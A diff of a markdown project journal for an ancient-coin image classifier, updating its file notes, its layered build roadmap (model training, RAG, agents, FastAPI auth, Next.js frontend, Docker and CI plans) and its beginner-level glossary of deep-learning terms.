+**`frontend/types/api.ts`**: TypeScript interfaces mirroring the Pydantic schemas from `src/api/schemas.py`. `ClassifyResponse`, `CnnResult`, `Top5Item`, `HistoryListResponse`, `HistorySummary`. Includes `vote_fraction: number | null`, `tta_passes: number`, `temperature: number`.
+
+#### `frontend/providers.tsx`
+**What it does**: Wraps the entire app in `<QueryClientProvider>` (TanStack Query) so any component can call `useQuery` and `useMutation`. Located above `app/layout.tsx` in the render tree.
+
+#### `frontend/.gitignore`
+Frontend-specific gitignore. Excludes `node_modules/`, `.next/` build output, `*.tsbuildinfo`.
+
+#### `frontend/.vscode/tasks.json`
+VS Code task definitions for the frontend. Allows running `npm run dev` via the VS Code task runner (`Ctrl+Shift+P → Run Task`).
+
+---
+
+### `src/agents/` — `.gitkeep` Files
+
+#### `src/agents/.gitkeep`, `src/api/.gitkeep`, `scripts/.gitkeep`, `tests/.gitkeep`, `notebooks/.gitkeep`
+**What these are**: Zero-byte placeholder files. Git can only track files, not empty directories. If a directory has no files, git will not create it when someone clones the repo. `.gitkeep` is the conventional name for a file whose only purpose is to mark a directory as intentionally present.  
+**When to remove**: Once the directory contains real files, the `.gitkeep` is redundant. Many projects leave it anyway for clarity.
+
+---
 
 ### Models Saved on Disk (Not in Git)
 
 ```
 models/
-├── best_model.pth              ← V3 best (epoch 52, val 79.25%, test 79.08%)
-├── best_model_v1_80pct.pth    ← V1 backup (epoch 46, val 80.99%, test 79.60%)
+├── best_model.pth              ← V3 best weights (epoch 52, val 79.25%, test 79.08%, TTA 80.03%)
+├── best_model_v1_80pct.pth    ← ⚠️ MISLEADING NAME — epoch 3, val 21.33%, NOT the 80% model
 ├── checkpoint_last.pth        ← V3 last epoch checkpoint (for --resume)
-├── class_mapping.pth          ← Current {class_to_idx, idx_to_class, num_classes}
+├── class_mapping.pth          ← Current {class_to_idx, idx_to_class, num_classes: 438}
 └── class_mapping_v1.pth       ← V1 class mapping backup
 ```
 
-**Never overwrite** `best_model_v1_80pct.pth` or `class_mapping_v1.pth` — these are the V1 backups.
+**Critical warning**: `best_model_v1_80pct.pth` has a misleading name. It is NOT the model that achieves 80% accuracy. It is from epoch 3 of V1 training (val accuracy 21.33%). The file was named before results were known. The real model is `best_model.pth`.
 
 ---
 
@@ -2216,125 +3152,1432 @@ This is original scientific content: "We discovered a cataloging anomaly candida
 
 ---
 
-## 17. What Comes Next — Updated Roadmap
+## 17. What Comes Next — Complete Roadmap with Every Detail
 
-Layers 0-3 are complete and production-ready. The next step is Layer 4.
+This roadmap covers everything that has been built and everything that remains. Think of it as the master plan for turning this academic project into a full industrial system.
+
+---
+
+### Understanding the Layer System
+
+The project is divided into numbered Layers. Each Layer represents a complete, independently testable subsystem. A Layer is only "done" when it is enterprise-grade and production-ready — meaning: it handles errors gracefully, has security hardening, is tested, and is documented.
+
+**The Iron Rule**: Never move to the next layer unless the current layer is fully engineered. A half-built foundation makes the whole tower unstable.
+
+---
+
+### ✅ Layer 0 — CNN Model Training (COMPLETE)
+
+**What it is**: Training the EfficientNet-B3 neural network on 7,677 ancient coin images.  
+**Status**: Fully complete. Enterprise-hardened.  
+**Final results**: 80.03% TTA accuracy (438 classes).  
+**How to verify**: Run `scripts/evaluate_tta.py` → should print `TTA accuracy: 80.03%`.  
+**Key files**: `scripts/train.py`, `src/core/dataset.py`, `src/core/model_factory.py`, `models/best_model.pth`  
+**Enterprise hardening applied**:
+- `weights_only=True` in all `torch.load()` calls (security: no arbitrary pickle execution)
+- `None` guard after `cv2.imread()` in dataset (raises clear `ValueError` on corrupt images)
+- All FutureWarnings and DeprecationWarnings cleaned up
+
+---
+
+### ✅ Layer 1 — Inference Engine (COMPLETE)
+
+**What it is**: The production wrapper that loads the trained model and exposes a clean `predict()` API.  
+**Status**: Fully complete.  
+**Key files**: `src/core/inference.py`, `scripts/predict.py`  
+**Enterprise hardening applied**:
+- `device="auto"` resolves before touching PyTorch (Bug 11 fix)
+- CLAHE preprocessing inside `_load_image()` — matches training pipeline exactly (Bug 16 fix)  
+- `model.eval()` + `torch.no_grad()` on every forward pass
+- 8-pass TTA available on demand
+- `weights_only=True` security patch
+
+---
+
+### ✅ Layer 2 — Knowledge Base & RAG Engine (COMPLETE)
+
+**What it is**: The enterprise retrieval system that stores and searches historical data on 9,541 Corpus Nummorum coin types.  
+**Status**: Fully complete. Upgraded from v1 (434 documents) to enterprise (47,705 vectors).  
+**Key files**: `src/core/rag_engine.py`, `scripts/build_knowledge_base.py`, `scripts/rebuild_chroma.py`  
+**Architecture**: BM25 keyword search + ChromaDB vector search + Reciprocal Rank Fusion (RRF)  
+**Enterprise hardening applied**:
+- Thread-safe singleton (`threading.Lock()` double-checked locking)
+- `in_training_set: bool` tag distinguishes CNN-known from KB-only types
+- Full 9,716-type scope (not just the 438 CNN training classes)
+
+---
+
+### ✅ Layer 3 — 5-Agent LangGraph System (COMPLETE)
+
+**What it is**: The agentic pipeline that routes coin analysis through specialist AI agents and generates professional PDF reports.  
+**Status**: Fully complete. 3/3 routing paths tested.  
+**Key files**: `src/agents/` (gatekeeper, historian, investigator, validator, synthesis)  
+**Enterprise hardening applied**:
+- Structured logging in all agents
+- Per-node timing (`time.perf_counter()`)
+- Retry with exponential backoff (2.5s/5s) for LLM calls
+- Graceful per-node degradation (errors stored in state, pipeline continues)
+- Multi-scale HSV analysis in validator
+- OpenCV fallback in investigator when no VLM available
+
+---
+
+### ✅ Layer 4 — FastAPI Backend (COMPLETE, Enterprise-Hardened)
+
+**What it is**: The HTTP API layer that exposes the agent pipeline as a REST API.  
+**Status**: Fully complete. 36/36 unit tests passing.  
+**Key files**: `src/api/main.py`, `src/api/routes/classify.py`, `src/api/routes/history.py`, `src/api/schemas.py`, `src/api/_store.py`, `src/api/auth/`, `src/api/db/`  
+**What the API exposes**:
+
+| Endpoint | Method | Purpose |
+|----------|--------|---------|
+| `/api/classify` | POST | Upload coin image, get full analysis |
+| `/api/history` | GET | Paginated classification history |
+| `/api/history/{id}` | GET | Single classification detail |
+| `/api/history/{id}` | DELETE | Remove a history record |
+| `/api/history/{id}/feedback` | POST | Mark-as-wrong correction |
+| `/api/health` | GET | 5-component health check |
+| `/api/metrics` | GET | Prometheus metrics |
+| `/api/reports/{filename}` | GET | PDF download |
+| `/auth/register` | POST | Create account |
+| `/auth/login` | POST | Login, receive JWT + cookie |
+| `/auth/verify-email` | GET | Activate account |
+| `/auth/refresh` | POST | Rotate refresh token |
+| `/auth/logout` | POST | Revoke tokens |
+| `/auth/me` | GET | Current user profile |
+| `/auth/forgot-password` | POST | Request password reset |
+| `/auth/reset-password` | POST | Apply reset |
+
+**Enterprise hardening applied**:
+- JWT authentication (access token 15min, refresh token 7 days with rotation)
+- bcrypt password hashing (work factor 12)
+- Rate limiting: 10 req/min on `/api/classify`
+- API key auth (`X-API-Key`) for machine-to-machine calls
+- PostgreSQL ORM schema (SQLAlchemy 2 async + Alembic migrations)
+- MAGIC BYTE MIME validation (file content, not filename extension)
+- Path traversal protection on uploads
+- GPU semaphore (max 1 concurrent CNN inference)
+- GZip compression on responses ≥500 bytes
+- X-Request-ID on every request
+- JSON structured logging for production
+- HSTS, CSP, X-Frame-Options, nosniff headers
+
+---
+
+### ✅ Layer 5 — Next.js 15 Frontend (COMPLETE, Enterprise-Hardened)
+
+**What it is**: The web application interface that lets users upload coins and view analysis results.  
+**Status**: Fully complete. Phase 3 and 4 UX features complete. 0 TypeScript errors.  
+**Key directory**: `frontend/`  
+**Pages**: `/` (main analysis), `/history` (paginated table), `/history/[id]` (detail)  
+**Enterprise hardening applied**:
+- Content Security Policy (dev/prod split)
+- HSTS (2 years, preload)  
+- X-Frame-Options: DENY
+- AbortController cancellation of in-flight requests
+- blob URL lifecycle management (no memory leaks)
+- Canvas-based image downsize before upload (max 1024px)
+- Screenshot detection + warning banner  
+**UX features**:
+- 3-state CNN confidence display (Identified / Consistent Match / Deep Search)
+- Mission Control animated pipeline overlay
+- Confidence anxiety elimination (no "failed to classify" language)
+- Corpus Nummorum external links throughout
+- Mark-as-wrong feedback form
+- Filter bar + delete in history table
+- Stats strip on history page
+- Copy link button on detail pages
+
+---
+
+### 🔄 Phase A — Authentication & Database Upgrade (In Progress)
+
+This is a sub-phase within Layers 4-5 that upgrades the system from session-less to fully authenticated with a proper relational database.
+
+#### ✅ Phase A1 — PostgreSQL Database Layer (COMPLETE, commit `40933f2`)
+**What was built**: Full SQLAlchemy 2 async ORM with 6 tables, Alembic migrations, Docker Compose with PostgreSQL 17.  
+**Files created**:
+- `src/api/db/base.py` — DeclarativeBase with naming conventions
+- `src/api/db/session.py` — async engine + `get_db()` dependency
+- `src/api/db/models.py` — 6 ORM tables: users, classifications, feedback, audit_log, email_verifications, refresh_tokens
+- `alembic/` — migration infrastructure
+- `alembic/versions/001_initial_schema.py` — full initial DDL  
+**Prerequisite to run**: Start PostgreSQL with `docker compose up postgres -d` then `alembic upgrade head`.
+
+#### ✅ Phase A2 — JWT Authentication System (COMPLETE, commit `40933f2`)
+**What was built**: Full 8-endpoint auth API with bcrypt, JWT access tokens, httpOnly refresh token cookies, token rotation, role-based access control, email verification.  
+**Files created**: `src/api/auth/utils.py`, `src/api/auth/deps.py`, `src/api/auth/email.py`, `src/api/auth/api_key.py`, `src/api/auth/router.py`, `src/api/auth/__init__.py`
+
+#### 🔲 Phase A3 — Per-User Rate Limiting + Audit Writes
+**What to build**:
+- Import `optional_user` into `routes/classify.py` — inject user into every classify request
+- Guest users: 10 requests/minute (current default)
+- Authenticated users: 60 requests/minute (higher limit as a benefit of having an account)
+- Write `AuditLog` entries when classifications are made, deleted, or feedback is submitted
+- `user_id = user.id if user else None` — guest analyses are still allowed, just anonymous  
+**Files to modify**: `src/api/routes/classify.py`, `src/api/routes/history.py`  
+**Estimated complexity**: Medium — 2 file changes, 30-40 lines, thorough testing needed.
+
+#### 🔲 Phase A4 — Migrate Classification Storage to PostgreSQL
+**What to build**:
+- Replace `src/api/_store.py` (SQLite) with `AsyncSession` + `Classification` ORM model
+- The 4-function API (`append`, `load_page`, `get_by_id`, `delete_by_id`) stays the same — only the implementation changes
+- `classify.py` route: call `db.add(Classification(...))` instead of `store.append(...)`
+- `history.py` route: query `select(Classification).order_by(Classification.timestamp.desc())` instead of `store.load_page()`
+- Feedback writes go to the `Feedback` table
+- Data migration: export SQLite records to PostgreSQL as part of the deployment  
+**Files to modify**: `src/api/routes/classify.py`, `src/api/routes/history.py`, `src/api/_store.py` (or replace it)  
+**Estimated complexity**: High — this is the largest remaining A-phase task.
+
+#### 🔲 Phase A5 — NextAuth.js v5 Frontend Authentication
+**What to build**:
+- Add `next-auth@5` to `frontend/package.json`
+- Create `frontend/auth.ts` with `CredentialsProvider` calling `POST /auth/login`
+- Create `frontend/app/api/auth/[...nextauth]/route.ts` (NextAuth API handler)
+- JWT callback: store `access_token` and `user` in the NextAuth session
+- Auto-refresh callback: if access token is expiring (<2 minutes), call `POST /auth/refresh`
+- Create `frontend/middleware.ts`: redirect unauthenticated users from protected routes (`/history/*`)  
+**Files to create**: `frontend/auth.ts`, `frontend/middleware.ts`, NextAuth route handler  
+**Estimated complexity**: High — involves understanding the NextAuth.js v5 App Router pattern.
+
+#### 🔲 Phase A6 — Login and Register Pages
+**What to build**:
+- `frontend/app/login/page.tsx` — email + password form, calls `signIn("credentials", {email, password})`
+- `frontend/app/register/page.tsx` — email + password + display_name form, calls `POST /auth/register`, shows "check your email" confirmation
+- Update `frontend/components/ui/header.tsx` — if session exists, show user's display_name + role badge + logout button; if not, show "Login" button  
+**Visual design**: Match existing dark navy palette. Use the existing `<card>` and `<button>` CVA components.  
+**Estimated complexity**: Medium — straightforward form pages, mostly frontend work.
+
+---
+
+### 🔲 Layer 6 — Docker Compose Infrastructure (PENDING)
+
+**What it is**: Containerising the entire application so it can be deployed on any machine with a single command.  
+**Current state**: `docker-compose.yml` exists with service definitions but has NOT been fully tested end-to-end.  
+**Target state**: `docker compose up` starts all 7 services; the app is accessible at `http://localhost:80`.
+
+**The 7 services**:
+
+```yaml
+services:
+  postgres:    # PostgreSQL 17-alpine — the relational DB
+  redis:       # Redis 7-alpine — caching layer (future use for session store + job queue)
+  api:         # FastAPI backend — the Python application
+  web:         # Next.js frontend — the React application  
+  nginx:       # Nginx 1.27 — reverse proxy (routes /api/* to FastAPI, /* to Next.js)
+  migrator:    # One-shot Alembic migration runner (profile=migrate)
+  chromadb:    # Standalone ChromaDB server
+```
+
+**What needs to be built in Layer 6**:
+1. Write `Dockerfile` for the FastAPI backend:
+   - Base: `python:3.11-slim`
+   - Install system deps (libGL for OpenCV)
+   - Copy `requirements.txt`, run `pip install`
+   - Copy source code
+   - CMD: `uvicorn src.api.main:app --host 0.0.0.0 --port 8000`
+2. Write `frontend/Dockerfile` for the Next.js app:
+   - Base: `node:20-alpine`
+   - `npm ci` (production-only install)
+   - `npm run build`
+   - CMD: `node server.js` (Next.js standalone mode)
+3. Write `nginx/nginx.conf`:
+   - `location /api/ { proxy_pass http://api:8000; }`
+   - `location / { proxy_pass http://web:3000; }`
+   - WebSocket upgrade headers for Next.js HMR
+4. Configure health-check dependencies in `docker-compose.yml`:
+   - `api` service: `depends_on: postgres: condition: service_healthy`
+   - This ensures PostgreSQL is ready before FastAPI tries to connect
+5. Volume mounts:
+   - `models/` — NVIDIA model weights (not copied into image, mounted at runtime)
+   - `data/metadata/` — ChromaDB vector index
+   - `data/uploads/` — temporary upload storage
+   - `reports/` — generated PDFs
+6. Environment variable injection via `.env` file
+7. Test the complete stack: `docker compose up --build` + submit a coin through the UI
+
+**Why Redis is included but not yet used**: Redis will power two future features:
+- Caching: store the analysis result for 1 hour so a second request for the same image returns instantly
+- Job queue: if analysis takes 20+ seconds, use Celery + Redis to run it asynchronously and return a job ID immediately
+
+**Estimated effort**: 3-5 engineering sessions.
+
+---
+
+### 🔲 Layer 7 — Tests and CI/CD Pipeline (PENDING)
+
+**What it is**: Comprehensive automated test suite + GitHub Actions pipeline that runs tests on every push.  
+**Current state**: 37 unit tests exist. No integration tests. No CI configuration.  
+**Target state**: `git push` triggers the CI pipeline; a green checkmark on GitHub means the code is safe to deploy.
+
+**Test pyramid to build**:
+
+```
+                    ┌──────────────────┐
+                    │  E2E Tests       │   Playwright — full browser tests
+                    │  (5-10 tests)    │   e.g., upload a coin, see a result
+                    ├──────────────────┤
+                    │  Integration     │   pytest with real DB (test PostgreSQL container)
+                    │  Tests (20-30)   │   e.g., POST /auth/login returns 200 + sets cookie
+                    ├──────────────────┤
+       ← More tests │  Unit Tests      │   Current 37 tests + expand to ~100
+       Faster ↑     │  (37 → ~100)     │   pure functions, no DB, no network
+                    └──────────────────┘
+```
+
+**Unit tests to add**:
+- `test_jwt.py`: create_access_token, decode_token, expired token, wrong type claim
+- `test_bcrypt.py`: hash_password output format, verify_password matching and non-matching
+- `test_schemas.py`: Pydantic model validation for ClassifyResponse and CnnResult
+- `test_rate_limiter.py`: 11th request in a window returns 429
+- `test_models.py`: UUID generation, timestamp fields, enum values
+
+**Integration tests to add**:
+- `test_auth_flow.py`: register → verify-email → login → refresh → logout (full flow)
+- `test_classify_route.py`: upload a real JPEG, check response schema, check history DB
+- `test_history_routes.py`: pagination, filtering, delete returns 204, feedback 200
+
+**GitHub Actions `.github/workflows/ci.yml`** to write:
+```yaml
+name: CI
+on: [push, pull_request]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    services:
+      postgres:          # test PostgreSQL container
+        image: postgres:17
+        env: POSTGRES_DB: deepcoin_test
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with: python-version: "3.11"
+      - run: pip install -r requirements.txt
+      - run: pytest tests/ -v --cov=src --cov-report=xml
+      - run: flake8 src/ tests/
+      - run: black --check src/ tests/
+```
+
+**Jest tests for frontend**:
+- `CoinUploader.test.tsx`: renders, accepts files, rejects non-image types
+- `AnalysisPanel.test.tsx`: renders the 3 confidence states correctly
+- `api.test.ts`: mock axios, verify correct endpoints are called
+
+**Playwright E2E tests**:
+- Upload `data/processed/1015/any_coin.jpg` via the browser, assert "DeepCoin Analysis" panel appears
+- Click history link, assert record appears in history table
+- Submit mark-as-wrong feedback, assert success message
+
+**Estimated effort**: 5-8 engineering sessions.
+
+---
+
+### 🔲 Layer 8 — Production Deployment (FUTURE)
+
+**What it is**: Deploying the system to a real server so it is accessible on the internet (not just localhost).  
+**Target**: YEBNI's infrastructure or a cloud VPS.
+
+**Checklist**:
+- [ ] Obtain SSL certificate (Let's Encrypt via Certbot + Nginx)
+- [ ] Configure Nginx for HTTPS redirect
+- [ ] Set production environment variables (`ENV=production`, real `JWT_SECRET`, real `DATABASE_URL`)
+- [ ] Set up database backups (PostgreSQL `pg_dump` to S3 via LocalStack in dev, real AWS S3 in prod)
+- [ ] Configure log aggregation (ship JSON logs to a log management service)
+- [ ] Configure monitoring (Prometheus + Grafana dashboard for `/api/metrics`)
+- [ ] Set up GitHub Secrets for CI/CD deployment
+
+---
+
+### Complete Feature Milestone Summary
+
+| # | Feature | Layer | Status |
+|---|---------|-------|--------|
+| 1 | Dataset preprocessing (CLAHE + resize) | L0 | ✅ |
+| 2 | CNN training (EfficientNet-B3, 80.03%) | L0 | ✅ |
+| 3 | Inference engine (TTA, CLAHE in pipeline) | L1 | ✅ |
+| 4 | Knowledge Base (9,541 CN types) | L2 | ✅ |
+| 5 | RAG engine (BM25 + vector + RRF) | L2 | ✅ |
+| 6 | 5-agent LangGraph pipeline | L3 | ✅ |
+| 7 | Professional PDF generation | L3 | ✅ |
+| 8 | FastAPI backend (classify + history) | L4 | ✅ |
+| 9 | Rate limiting (slowapi, 10/min) | L4 | ✅ |
+| 10 | API key auth (X-API-Key + hmac) | L4 | ✅ |
+| 11 | JSONstructured logging | L4 | ✅ |
+| 12 | PostgreSQL ORM (6 tables, Alembic) | A1 | ✅ |
+| 13 | JWT auth (8 endpoints, token rotation) | A2 | ✅ |
+| 14 | Per-user rate limiting | A3 | 🔲 |
+| 15 | AuditLog writes in classify route | A3 | 🔲 |
+| 16 | SQLite → PostgreSQL migration | A4 | 🔲 |
+| 17 | Next.js frontend (full UI) | L5 | ✅ |
+| 18 | Mission Control animation | L5 | ✅ |
+| 19 | 3-way confidence display | L5 | ✅ |
+| 20 | Screenshot warning banner | L5 | ✅ |
+| 21 | Mark-as-wrong feedback | L5 | ✅ |
+| 22 | NextAuth.js v5 integration | A5 | 🔲 |
+| 23 | Login / Register pages | A6 | 🔲 |
+| 24 | Docker Compose (7 services) | L6 | 🔲 |
+| 25 | Full test suite (~100 tests) | L7 | 🔲 |
+| 26 | GitHub Actions CI | L7 | 🔲 |
+| 27 | Production deployment | L8 | 🔲 |
 
 ---
 
 ## 18. Full Glossary — Every Technical Term Explained Like You're 5
 
-**Accuracy**: Out of all the questions the model answered, what percentage did it get right? Test accuracy = 79.08% means it identified the right coin type 790 times out of 1000.
-
-**AdamW**: The algorithm that decides how to adjust the model's weights after each training batch. Stands for "Adam with Weight Decay." Adam tracks momentum (which direction has been working) and adapts each weight's learning speed separately.
-
-**AMP (Automatic Mixed Precision)**: A trick to run the neural network calculations in 16-bit numbers instead of 32-bit numbers. This uses half the memory and runs 2-4× faster on modern GPUs. Special care is needed to prevent 16-bit numbers from "underflowing" to zero.
-
-**Augmentation**: Randomly modifying training images (flipping, rotating, changing brightness, etc.) to make the model see more variety. Like a student who practices math problems in different fonts — they learn the concepts, not the specific presentation.
-
-**Batch Size**: How many images we process together in one step. batch_size=16 means 16 images go through the model at once, and we adjust weights once based on all 16 mistakes together.
-
-**Beta Distribution**: A probability distribution that outputs numbers between 0 and 1. We use Beta(0.4, 0.4) to generate the Mixup blend ratio λ. This distribution tends to give values near 0 or near 1, meaning one image usually dominates in the mix.
-
-**BGR vs RGB**: OpenCV loads images with Blue, Green, Red channel order (BGR). Neural networks trained on ImageNet expect Red, Green, Blue order (RGB). Swapping is required to avoid feeding the wrong color information.
-
-**Checkpoint**: A saved snapshot of all model weights at a specific moment. Like saving a video game. If training crashes, you can load the checkpoint and continue from where you left off.
-
-**CLAHE**: Contrast Limited Adaptive Histogram Equalization. Makes dark details in an image brighter without blowing out the bright areas. Think of it as "local brightness adjustment" — it can make worn coin inscriptions visible that were previously invisible.
-
-**class_to_idx / idx_to_class**: Dictionaries that convert between folder names ("3987") and integer labels (241). Neural networks need integers. Humans need names. These dictionaries translate between the two worlds.
-
-**CNN (Convolutional Neural Network)**: A type of neural network designed for images. It uses sliding window operations (convolutions) to detect patterns at every location in the image — edges, textures, shapes, eventually complex objects.
-
-**CrossEntropyLoss**: The function that measures how wrong the model is. For a 438-class problem, it looks at the probability the model assigned to the correct class and penalizes the model proportionally to how low that probability was.
-
-**CUDA**: NVIDIA's parallel computing platform. Translates PyTorch operations into instructions that run on the GPU's thousands of small cores simultaneously. Without CUDA, training would take 10-100× longer.
-
-**DataLoader**: PyTorch's conveyor belt. It takes a Dataset object and feeds it to the model in batches, using multiple CPU threads to pre-load the next batch while the GPU trains on the current one.
-
-**Dataset (PyTorch)**: A Python class that tells PyTorch how to load one sample (image + label). Must implement `__len__` (how many samples?) and `__getitem__` (give me sample number N).
-
-**Dropout**: A regularization technique. During training, randomly set 40% of neuron values to zero before the final classification layer. This forces the model to learn redundant representations and prevents memorization.
-
-**Early Stopping**: Automatically stop training if validation accuracy hasn't improved for N consecutive epochs (patience=10). Prevents wasting time on epochs that only cause more overfitting.
-
-**EfficientNet**: A family of CNN models (B0 through B7) designed by Google to be efficient — getting high accuracy with fewer parameters by carefully scaling width, depth, and resolution together. We use B3.
-
-**Epoch**: One complete pass through the entire training dataset. In V3 training, one epoch = 5,373 training images seen, weights updated ~336 times (5373/16 batches).
-
-**F1-Score**: A balanced metric that combines precision and recall: `2 × (P × R) / (P + R)`. F1=1.0 is perfect, F1=0.0 is completely wrong. Useful when classes are imbalanced (pure accuracy would be misleading).
-
-**Fine-tuning**: Taking a model pre-trained on one dataset (ImageNet) and continuing training on your smaller dataset (7,677 coins). The model's previously learned visual features serve as a starting point.
-
-**float16 / float32**: Number precision. float32 uses 32 bits (4 bytes) per number. float16 uses 16 bits (2 bytes). float16 is less precise (can represent fewer distinct values) but uses half the memory and is faster on Tensor Cores.
-
-**GradScaler**: The safety mechanism for AMP. Multiplies the loss by a large number before backward pass (to prevent float16 underflow), then divides back before weight update. Automatically adjusts the scale factor if overflow is detected.
-
-**Gradient**: The direction and magnitude to adjust each weight to reduce the loss. Computed by the backward pass (backpropagation).
-
-**Gradient Clipping**: Limits the size of gradient updates. If a gradient would update a weight by more than 1.0 units, clip it to 1.0. Prevents a single bad training batch from catastrophically corrupting the model.
-
-**Hotspot (confusion hotspot)**: A pair of classes that the model confuses far more often than expected. For us: class 3314 → 3987 (10× confusion). Indicates visual similarity or data quality issues.
-
-**ImageNet**: A dataset of 1.2 million images across 1,000 object categories. Used to pre-train vision models. The statistics of ImageNet (mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225]) are used for normalization.
-
-**Label Smoothing**: Instead of training the model to be 100% confident ("class 3987"), train it to be 85% confident. The remaining 15% is spread equally across all other classes. Prevents overconfident predictions on noisy/ambiguous data.
-
-**Lazy Loading**: Load data only when it's actually needed, not all at once upfront. Our dataset stores only file paths in memory and loads actual images one-by-one during training. Saves RAM.
-
-**Learning Rate (lr)**: How large each weight update step is. Too large: the model oscillates wildly and never converges. Too small: training is extremely slow. 1e-4 = 0.0001 is the empirically validated sweet spot for fine-tuning pretrained vision models.
-
-**Learning Rate Scheduler**: A policy for automatically changing the learning rate during training. CosineAnnealingLR smoothly reduces lr from 1e-4 to 1e-6 following a cosine curve.
-
-**Long-Tail Distribution**: A dataset where a few classes have many examples and many classes have very few. Named for the shape of the frequency histogram: a tall head (common classes) and a long thin tail (rare classes).
-
-**Mixup**: A training technique that blends two images and their labels: `mixed = λ × A + (1-λ) × B`. Forces the model to learn smooth decision boundaries rather than memorizing specific training images.
-
-**model.eval() vs model.train()**: `model.train()` enables Dropout and batch normalization in training mode. `model.eval()` disables Dropout (uses all neurons) and fixes batch norm statistics. Always call `model.eval()` before inference.
-
-**Normalization**: Centering and scaling pixel values to a standard range expected by the model. For ImageNet pretrained models: subtract mean [0.485, 0.456, 0.406], divide by std [0.229, 0.224, 0.225]. Converts [0,255] pixel range to approximately [-2.1, 2.6].
-
-**Overfitting**: The model performs much better on training data than on unseen data. Like a student who memorizes the textbook word-for-word instead of understanding the concepts — fails on novel exam questions.
-
-**Padding (image padding)**: Adding black pixels to the edges of a resized image to reach the target size without distorting the image content. Used when images are not square.
-
-**pin_memory**: A CUDA optimization that locks memory pages in RAM so the GPU can access them faster via DMA (Direct Memory Access). Enabled for the training DataLoader for maximum transfer speed.
-
-**Precision**: Of all the times the model predicted class X, what fraction were actually class X? High precision = when the model says "3987," it's usually right.
-
-**Recall**: Of all the actual class X images, what fraction did the model correctly identify? High recall = the model finds most of the actual class X images.
-
-**ReduceLROnPlateau**: A learning rate scheduler that reduces lr by a factor when a metric stops improving for N epochs (patience). Used in V1. Replaced by CosineAnnealingLR in V3.
-
-**Resume (training resume)**: The ability to stop training at any point and continue later without losing progress. Requires saving and restoring model weights, optimizer state, scheduler position, and AMP scaler state.
-
-**Softmax**: A mathematical function that converts raw model output (arbitrary numbers) to probabilities that sum to 1.0. `softmax([2.3, -0.4, 1.7])` → `[0.72, 0.05, 0.23]`.
-
-**Stratified Split**: Dividing a dataset into train/val/test while preserving each class's proportion in all three splits. Without stratification, random chance might put all examples of rare classes in one split.
-
-**Subset**: A PyTorch wrapper that creates a "view" of a dataset using only specified indices. `Subset(full_dataset, [0,1,5,10])` looks like a 4-sample dataset without copying any data.
-
-**TTA (Test-Time Augmentation)**: Running inference 5 times on augmented versions of the same image and averaging the probability distributions. More stable predictions with no additional training. +0.95% accuracy for us.
-
-**Tensor Cores**: Dedicated hardware in modern NVIDIA GPUs (RTX 20xx and later) for extremely fast float16 matrix multiplication. The RTX 3050 Ti has 80 Tensor Cores that enable AMP's speed improvement.
-
-**Transfer Learning**: Using a model trained on one task (ImageNet classification) as a starting point for a different task (coin classification). The learned visual features transfer across domains.
-
-**Validation Set**: 15% of the data held out from training. After each epoch, we evaluate on the validation set to monitor progress and detect overfitting. Never used to update model weights.
-
-**VRAM (Video RAM)**: Memory on the GPU (RTX 3050 Ti: 4.3GB). Stores model weights, gradients, optimizer states, and the current batch during training. Limited VRAM forces us to use batch_size=16.
-
-**Virtual Environment (venv)**: An isolated Python installation for a specific project. Packages installed in the venv don't affect other projects. Activated with `.\venv\Scripts\Activate.ps1`.
-
-**weight_decay**: An L2 regularization term in the optimizer. Adds a small penalty proportional to the square of each weight's value, pulling all weights gently toward zero. Prevents the model from growing very large weights that fit only training data.
-
-**WeightedRandomSampler**: A PyTorch sampler that draws samples according to per-sample weights. Rare classes get high weights (drawn often), common classes get low weights (drawn rarely). Balances class representation in each epoch.
-
-**`torch.no_grad()`**: A context manager that tells PyTorch not to track gradients during inference. Since we never call `.backward()` during evaluation, disabling gradient tracking saves ~50% memory and speeds up inference ~2×.
+This glossary covers every technical word used anywhere in this project. Terms are grouped by topic so related concepts appear together. If you read an unfamiliar word in any section of this journal, search here first.
 
 ---
 
+### Part 1 — Neural Networks and Deep Learning
+
 ---
+
+**Accuracy**  
+Out of all the questions the model answered, what percentage did it get right?  
+Test accuracy = 79.08% means it identified the right coin type 790 times out of every 1,000 test coins.  
+Formula: `correct_predictions / total_predictions`
+
+---
+
+**AdamW**  
+The algorithm that decides how much to adjust each weight after each training batch. Short for "Adam with Weight Decay."  
+- **Adam**: tracks a "momentum" (which direction has been working recently) AND a "speed limit" for each weight individually. Weights that have been changing consistently get larger updates; weights that have been bouncing around get smaller updates.  
+- **Weight Decay**: adds a small penalty proportional to the square of each weight's current value. This gently pulls all weights toward zero and prevents the model from building very large weights that only fit the training data.  
+`lr=1e-4` means each step moves weights 0.01% of the gradient direction.
+
+---
+
+**AMP (Automatic Mixed Precision)**  
+A trick to run neural network calculations in 16-bit numbers (float16) instead of the usual 32-bit numbers (float32).  
+- **Benefit**: uses half the GPU memory and runs 2-4× faster on Tensor Cores (special hardware in modern NVIDIA GPUs)  
+- **Risk**: float16 can only represent numbers down to ~6×10⁻⁵. Very small gradient values underflow to zero and the model stops learning.  
+- **Solution**: `GradScaler` rescales gradients up before the backward pass and down before the optimizer step, keeping them in the float16 safe range.
+
+---
+
+**Augmentation**  
+Randomly modifying training images (flipping, rotating, adding noise, changing brightness) to make the model see more variety without collecting new data.  
+Think of it like a student who practices the same math problem shown in different fonts, handwriting styles, and orientations. They learn the underlying concept (coin iconography) not the specific presentation (exact pixel positions in this one photo).  
+We apply 6 transforms: Rotate ±15°, BrightnessContrast ±20%, GaussNoise, ElasticTransform, HorizontalFlip, Normalize.
+
+---
+
+**Batch Size**  
+How many images are processed together in one step. `batch_size=16` means 16 images go through the model at once, and weights are updated once based on the average mistake across all 16.  
+Why 16? The RTX 3050 Ti has 4.3 GB VRAM. 16 images at 299×299×3 + model weights + gradients + optimizer states ≈ 3.8 GB. Batch size 32 causes OOM.
+
+---
+
+**Beta Distribution**  
+A probability distribution that outputs values between 0 and 1. Used to generate the Mixup blend ratio λ. `Beta(0.2, 0.2)` tends to give values near 0 or near 1 (one image dominates), not near 0.5 (equal blend). This means Mixup mostly creates slightly-modified images, not bizarre 50/50 combinations.
+
+---
+
+**BGR vs RGB**  
+OpenCV loads images with channels in order Blue, Green, Red (BGR). Neural networks trained on ImageNet expect Red, Green, Blue (RGB). The channels carry different information. If you forget to swap them, the model interprets blue sky as red — accuracy drops significantly.  
+Fix: `cv2.cvtColor(img, cv2.COLOR_BGR2RGB)`
+
+---
+
+**Checkpoint**  
